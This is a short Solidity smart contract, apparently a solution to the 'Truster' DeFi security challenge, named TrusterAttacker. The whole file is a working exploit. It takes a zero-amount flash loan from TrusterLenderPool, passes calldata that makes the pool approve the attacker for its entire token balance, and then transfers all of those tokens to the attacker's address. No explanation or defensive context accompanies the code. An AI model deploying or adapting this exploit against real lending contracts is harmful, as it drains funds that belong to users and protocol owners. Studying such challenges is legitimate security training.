pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./TrusterLenderPool.sol";

contract TrusterAttacker {
    IERC20 public token;
    TrusterLenderPool public  pool;

    constructor (address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function attack(address attackerEOA) external {
        uint256 poolBalance = token.balanceOf(address(pool));
         bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), poolBalance
        );

        pool.flashLoan(0, attackerEOA, address(token), data);

        token.transferFrom(address(pool), attackerEOA, poolBalance);
    }
} 